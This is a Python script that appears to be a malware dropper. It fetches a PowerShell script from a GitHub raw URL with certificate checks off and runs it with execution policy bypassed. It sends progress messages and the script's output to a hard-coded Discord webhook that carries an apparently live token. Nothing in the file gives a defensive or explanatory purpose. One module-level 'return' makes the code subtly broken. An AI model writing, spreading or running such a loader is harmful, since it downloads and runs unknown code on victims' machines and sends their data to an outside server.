import subprocess
import tempfile
import os
import requests
import traceback

WEBHOOK_URL = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'
SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.ps1'

def send(msg, color=0x00FF00):
    try:
        requests.post(WEBHOOK_URL, json={'embeds': [{'description': str(msg)[:4000], 'color': color}]})
    except:
        pass

try:
    send('starting')
    os.system('py -m pip install requests')
    os.system('python -m pip install requests')
    os.system('pip install requests')
    send('requests installed')
    send('downloading script')
    r = requests.get(SCRIPT_URL, verify=False)
    if r.status_code != 200:
        send(f'failed to download script ({r.status_code})', 0xFF0000)
        return
    script_content = r.content
    send('downloaded script')
    with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1', mode='wb') as f:
        f.write(script_content)
        temp = f.name
    send(f'saved temp file: {temp}')
    try:
        send('executing via cmd+ps1')
        result = subprocess.run(
            ['cmd.exe', '/c', f'powershell.exe -ExecutionPolicy Bypass -File "{temp}"'],
            capture_output=True,
            text=True
        )
        send(f'return code: {result.returncode}')
        if result.stdout.strip():
            send(f'stdout:\n{result.stdout[:1900]}')
        if result.stderr.strip():
            send(f'stderr:\n{result.stderr[:1900]}', 0xFF0000)
        if result.returncode == 0:
            send('script executed successfully')
        else:
            send('script failed', 0xFF0000)
    except Exception as e:
        send(f'subprocess error: {e}\n{traceback.format_exc()}', 0xFF0000)
    finally:
        try:
            os.unlink(temp)
            send('temp file deleted')
        except Exception as e:
            send(f'failed to delete temp file: {e}', 0xFF0000)
except Exception as e:
    send(f'critical error: {e}\n{traceback.format_exc()}', 0xFF0000)
